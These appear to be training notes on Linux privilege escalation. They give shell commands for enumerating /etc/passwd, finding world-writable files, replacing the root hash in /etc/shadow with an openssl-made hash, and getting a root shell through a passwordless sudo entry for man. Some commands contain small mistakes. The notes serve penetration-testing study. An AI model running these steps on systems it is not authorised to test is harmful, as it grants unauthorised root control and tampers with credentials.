
## Linux Privilege Escalation

To identify privilege escalation vulnerabilities, use **LinEnum** script for automation.

Other doc:

https://delinea.com/blog/linux-privilege-escalation

**\-Weak Permissions**

**\-SUDO Privileges**

**1.Weak Permissions**

_Exploit files or binaries that have weak permisions._

enumerate users on the system

```plaintext
cat /etc/passwd
```

enumerate groups

```plaintext
groups
cat etc/group
```

Search directories for files with permissions where all users can write or make changes to the file.

```plaintext
find / -not -type l -perm -o+w
```

Look for a file that can be useful in elevating privileges, like the ones in etc directory.

For example, if we find that we can write the shadow file, then we can overwrite the root password, resulting in eleveting our privileges.

To change the password we first need to hash it.

```plaintext
 openssl passwd -1 -salt abc mynewpassword
```

We can take the hashed password and put it in the shadow file, replacing \*.

now switch to the root using our password

```plaintext
sudo su
```
### 2.SUDO Privileges

_Identify binaries and executables with weak sudo privileges and use them to elevate privileges._

enumerate users

```plaintext
cat /etc/passwd
```

see commands which can be run

```plaintext
sudo -l
```

it can say that we can run a command as root. Ex: (**root) NOPASSWD /usr/bin/man**

\*in this case, man binary can execute any program as administrator. It can allow users to spawn a shell session from within the utility.Â 

"man" is a manual on how to use a specific command in Linux. This can be edited and we can insert a code in there to have a shell or bash and elevate our privileges.

example of man commands

```plaintext
man cat
man ls
man sudo
man mkdir
man vim
```

etc

try to see if it works. If it does, we should not be asked to provide any password.

```plaintext
sudo man cat
```

manual file, we can insert text to spawn a bash session and hit enter.

```plaintext
!/bin/bash
```
